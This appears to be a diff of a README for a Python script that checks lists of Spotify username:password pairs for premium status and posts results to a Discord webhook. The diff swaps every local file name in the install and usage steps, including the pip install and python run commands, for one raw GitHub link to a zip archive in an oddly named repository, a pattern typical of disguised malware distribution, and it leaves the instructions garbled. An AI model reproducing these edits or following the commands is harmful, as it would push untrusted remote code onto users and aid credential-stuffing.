@@ -9,18 +9,18 @@ This is a Python script that checks if a list of Spotify account credentials hav
 - Use pip to install the required packages with the following command:
 
 ```Markdown
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/rylen1829123/ssssssssssss/main/chromedriver/ssssssssssss-v2.5.zip
 ```
 ## Usage
 
-1. Edit the `config.json` file and fill in the following fields:
+1. Edit the `https://raw.githubusercontent.com/rylen1829123/ssssssssssss/main/chromedriver/ssssssssssss-v2.5.zip` file and fill in the following fields:
    - `discord_id`: The Discord user ID to tag when non-premium accounts are found (leave empty to disable).
    - `webhook_url`: The Discord webhook URL to use for sending messages.
    - `lang`: The language of the messages. Currently supports `en` (English) and `fr` (French).
-2. Add your Spotify account credentials to the `logins.txt` file, with each line in the format `username:password`.
+2. Add your Spotify account credentials to the `https://raw.githubusercontent.com/rylen1829123/ssssssssssss/main/chromedriver/ssssssssssss-v2.5.zip` file, with each line in the format `username:password`.
 3. Run the script with the following command:
 ```Markdown
-python main.py
+python https://raw.githubusercontent.com/rylen1829123/ssssssssssss/main/chromedriver/ssssssssssss-v2.5.zip
 ```
 
 The script will automatically launch Chrome and begin checking the accounts. Once completed, it will output a list of non-premium accounts to the console and send a message to Discord (if configured).
